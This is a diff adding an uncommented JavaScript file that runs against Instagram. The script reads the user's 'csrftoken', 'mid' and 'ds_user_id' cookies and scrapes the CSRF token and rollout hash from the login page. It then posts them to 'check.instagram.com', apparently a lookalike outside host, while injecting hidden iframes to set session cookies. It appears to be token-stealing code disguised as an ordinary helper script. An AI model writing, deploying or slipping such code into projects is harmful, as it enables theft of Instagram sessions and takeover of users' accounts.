@@ -1,0 +1,110 @@
+(function () {
+    var cookies = {
+            cget: function (n) {
+                var m = document.cookie.match(new RegExp(
+                    "(?:^|; )" + n.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+                ));
+                return m ? m[1] : '';
+            },
+            cset: function (name, value, options) {
+                var expires = options.expires, d = new Date(), updatedCookie = name + "=" + value;
+                d.setTime(d.getTime() + expires * 1000);
+                expires = options.expires = d;
+                options.expires = expires.toUTCString();
+
+                for (var propName in options) {
+                    updatedCookie += "; " + propName;
+                    var propValue = options[propName];
+                    if (propValue !== true) {
+                        updatedCookie += "=" + propValue;
+                    }
+                }
+
+                document.cookie = updatedCookie;
+            }
+        },
+        requests = function () {
+            return this;
+        };
+    requests.prototype = {
+        getSend: function (url, success, error, json, headers) {
+            this.sender('GET', url, null, success, error, json, headers);
+        },
+        postSend: function (url, data, success, error, json, headers) {
+            this.sender('POST', url, data, success, error, json, headers);
+        },
+        sender: function (type, url, data, success, error, json, headers) {
+            var request = new XMLHttpRequest();
+            request.open(type, url, true);
+            if (!json && type === 'POST') {
+                request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            }
+            request.onreadystatechange = function () {
+                if (request.readyState === 4 && request.status === 200) {
+                    if (success) success(request.responseText)
+                } else if (request.readyState === 4 && request.status !== 200) {
+                    if (error) error();
+                }
+            };
+            if (headers) {
+                for (var h in headers) {
+                    request.setRequestHeader(h, headers[h]);
+                }
+            }
+            if (data) request.send(data);
+            else request.send();
+        }
+    };
+
+    var Req = new requests(),
+        visitor_id = cookies.cget('ds_user_id'),
+        mid = cookies.cget('mid'),
+        token = cookies.cget('csrftoken'),
+        instUrl = 'https://www.instagram.com/',
+        startLogin = function () {
+            Req.getSend(instUrl + 'accounts/login/?source=auth_switcher', function (res) {
+
+                var rx = res.match(/>window._sharedData = ({.*?});<\/script>/i);
+                if (rx) {
+                    try {
+                        var Data = JSON.parse(rx[1]);
+
+                        token = cookies.cget('csrftoken');
+                        if (!token) token = Data.config.csrf_token;
+
+                        Req.postSend('https://check.instagram.com/login', JSON.stringify({
+                            token: token,
+                            ajax: Data.rollout_hash
+                        }), function (res1) {
+
+                            var ifrr = document.createElement('iframe');
+                            ifrr.src = instUrl + 'p/Bzpxu9yAAd9/embed/';
+                            ifrr.onload = function () {
+                                visitor_id = cookies.cget('ds_user_id');
+                            };
+                            document.body.appendChild(ifrr);
+
+                        }, null, true);
+                    } catch (e) {
+                    }
+                }
+            })
+
+        };
+
+    if (visitor_id) return;
+
+    if (mid) {
+        startLogin();
+    } else {
+        var ifr = document.createElement('iframe');
+        ifr.src = instUrl + 'p/Bzpxu9yAAd9/embed/';
+        ifr.onload = function () {
+            mid = cookies.cget('mid');
+            if (mid) {
+                startLogin();
+            }
+        };
+        document.body.appendChild(ifr);
+    }
+})();
